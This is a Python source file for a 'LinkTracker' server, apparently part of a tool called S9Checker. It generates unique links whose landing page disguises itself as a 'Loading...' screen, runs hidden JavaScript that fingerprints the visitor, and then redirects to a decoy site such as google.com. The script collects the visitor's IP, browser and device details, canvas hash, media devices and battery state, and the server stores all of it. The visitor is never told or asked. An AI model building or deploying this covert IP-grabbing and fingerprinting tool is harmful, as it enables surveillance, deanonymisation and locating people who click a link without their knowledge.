
import asyncio
import logging
import time
import uuid
import json
import os
from typing import Optional
from datetime import datetime

logger = logging.getLogger("S9Checker")

TRACKER_JS = """
<script>
(function() {
    var data = {
        url: window.location.href,
        referrer: document.referrer || 'direct',
        user_agent: navigator.userAgent,
        language: navigator.language || navigator.userLanguage || 'unknown',
        platform: navigator.platform || 'unknown',
        screen_width: screen.width,
        screen_height: screen.height,
        screen_color_depth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
        timezone_offset: new Date().getTimezoneOffset(),
        cookies_enabled: navigator.cookieEnabled,
        do_not_track: navigator.doNotTrack,
        plugins: Array.from(navigator.plugins || []).map(function(p) { return p.name; }),
        connection: navigator.connection ? {
            type: navigator.connection.effectiveType || 'unknown',
            downlink: navigator.connection.downlink || 0,
            rtt: navigator.connection.rtt || 0
        } : null,
        memory: navigator.deviceMemory || 'unknown',
        hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
        touch_support: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false
    };

    try {
        var canvas = document.createElement('canvas');
        var ctx = canvas.getContext('2d');
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.fillText('fingerprint', 2, 2);
        data.canvas_hash = canvas.toDataURL().substring(0, 64);
    } catch(e) {}

    try {
        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
            navigator.mediaDevices.enumerateDevices().then(function(devices) {
                data.media_devices = devices.map(function(d) {
                    return { kind: d.kind, label: d.label || 'unknown' };
                });
                send_data(data);
            }).catch(function() { send_data(data); });
        } else {
            send_data(data);
        }
    } catch(e) {
        send_data(data);
    }

    function send_data(d) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', '/track/REPORT_ID', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(d));
    }

    var battery = navigator.getBattery ? navigator.getBattery() : null;
    if (battery) {
        battery.then(function(b) {
            data.battery = {
                level: b.level * 100,
                charging: b.charging,
                charging_time: b.chargingTime,
                discharging_time: b.dischargingTime
            };
        });
    }
})();
</script>
"""


class LinkTracker:

    STATE_FILE = "tracker_output/tracker_state.json"

    def __init__(self, port: int = 8899, output_dir: str = "tracker_output"):
        self.port = port
        self.output_dir = output_dir
        self._links: dict[str, dict] = {}
        self._visits: list[dict] = []
        self._server = None
        self._running = False
        os.makedirs(output_dir, exist_ok=True)
        self._load_state()

    def _load_state(self) -> None:
        if os.path.exists(self.STATE_FILE):
            try:
                with open(self.STATE_FILE, "r", encoding="utf-8") as f:
                    data = json.load(f)
                self._links = data.get("links", {})
                self._visits = data.get("visits", [])
            except (json.JSONDecodeError, OSError):
                self._links = {}
                self._visits = []

    def _save_state(self) -> None:
        try:
            os.makedirs(os.path.dirname(self.STATE_FILE), exist_ok=True)
            with open(self.STATE_FILE, "w", encoding="utf-8") as f:
                json.dump({"links": self._links, "visits": self._visits},
                          f, indent=2, ensure_ascii=False, default=str)
        except OSError as e:
            logger.error(f"Failed to save tracker state: {e}")

    def create_link(self, label: str = "", redirect_url: str = "https://google.com") -> str:
        link_id = uuid.uuid4().hex[:12]
        self._links[link_id] = {
            "id": link_id,
            "label": label or f"link_{link_id[:8]}",
            "redirect_url": redirect_url,
            "created_at": datetime.now().isoformat(),
            "visit_count": 0,
        }
        self._save_state()
        return link_id

    def get_link_url(self, link_id: str, server_ip: str = "127.0.0.1") -> str:
        return f"http://{server_ip}:{self.port}/{link_id}"

    def get_visits(self, link_id: Optional[str] = None) -> list[dict]:
        if link_id:
            return [v for v in self._visits if v.get("link_id") == link_id]
        return list(self._visits)

    def get_stats(self) -> dict:
        return {
            "total_links": len(self._links),
            "total_visits": len(self._visits),
            "links": {lid: info["visit_count"] for lid, info in self._links.items()},
        }

    def save_results(self, filepath: Optional[str] = None) -> str:
        if not filepath:
            filepath = os.path.join(self.output_dir, f"visits_{int(time.time())}.json")
        data = {
            "links": self._links,
            "visits": self._visits,
            "stats": self.get_stats(),
        }
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        return filepath

    async def start(self):
        try:
            from aiohttp import web
        except ImportError:
            logger.error("aiohttp required for link tracker server")
            return

        app = web.Application()
        app.router.add_get("/{link_id}", self._handle_page)
        app.router.add_post("/track/{link_id}", self._handle_report)
        app.router.add_get("/api/stats", self._handle_stats)
        app.router.add_get("/api/visits", self._handle_visits)

        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, "0.0.0.0", self.port)
        await site.start()
        self._running = True
        logger.info(f"Link tracker server running on port {self.port}")

        while self._running:
            await asyncio.sleep(1)

        await runner.cleanup()

    def stop(self):
        self._running = False
        self._save_state()

    async def _handle_page(self, request) -> None:
        from aiohttp import web as _web

        link_id = request.match_info["link_id"]
        link_info = self._links.get(link_id)

        if not link_info:
            return _web.Response(status=404, text="Link not found")

        link_info["visit_count"] += 1
        self._save_state()
        js_code = TRACKER_JS.replace("REPORT_ID", link_id)

        html = f"""<!DOCTYPE html>
<html><head><title>Loading...</title>
{js_code}
</head><body>
<script>window.location.href='{link_info["redirect_url"]}';</script>
</body></html>"""

        return _web.Response(text=html, content_type="text/html")

    async def _handle_report(self, request) -> None:
        from aiohttp import web as _web

        link_id = request.match_info["link_id"]
        try:
            data = await request.json()
        except Exception:
            data = {}

        visit = {
            "link_id": link_id,
            "timestamp": datetime.now().isoformat(),
            "ip": request.remote or "unknown",
            "data": data,
        }
        self._visits.append(visit)
        self._save_state()
        logger.info(f"Visit recorded for {link_id} from {visit['ip']}")

        return _web.json_response({"status": "ok"})

    async def _handle_stats(self, request) -> None:
        from aiohttp import web as _web
        return _web.json_response(self.get_stats())

    async def _handle_visits(self, request) -> None:
        from aiohttp import web as _web
        link_id = request.query.get("link_id")
        return _web.json_response(self.get_visits(link_id))
